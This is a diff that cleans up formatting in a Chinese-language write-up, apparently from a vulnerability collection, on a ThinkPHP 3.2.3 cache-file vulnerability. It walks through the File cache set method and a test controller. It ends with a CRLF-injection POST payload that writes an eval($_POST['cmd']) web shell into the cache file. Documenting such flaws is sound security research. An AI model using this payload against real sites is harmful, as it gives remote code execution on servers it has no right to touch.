@@ -53,9 +53,8 @@ Thinkphp 3.2.3
 
 -   直接跟进到`/Library/Think/Cache/File.class.php`文件，看到set方法：
 
-```{=html}
 <!-- -->
-```
+
 -   /**
              * 写入缓存
              * @access public
@@ -96,14 +95,12 @@ Thinkphp 3.2.3
                 }
             }
 
-```{=html}
 <!-- -->
-```
+
 -   写一个调用缓存函数的的方法，运行一下。看看写进去什么
 
-```{=html}
 <!-- -->
-```
+
 -   <?php
         namespace Home\Controller;
         use Think\Controller;
@@ -115,9 +112,8 @@ Thinkphp 3.2.3
             }
         }
 
-```{=html}
 <!-- -->
-```
+
 -   在set方法下断点，访问
     `http://www.0-sec.org/index.php/Home/Index/index.html`
     ，post数据：`a3=aaaa`
@@ -132,9 +128,8 @@ Thinkphp 3.2.3
 
 -   `$data`参数未过滤`%0d%0a`可以用换行来绕过行注释，尝试post数据：
 
-```{=html}
 <!-- -->
-```
+
 -   `a3=%0d%0aeval($_POST['cmd']);%0d%0a//`
 
 ![](./.resource/Thinkphp3.2.3缓存漏洞/media/rId27.png)
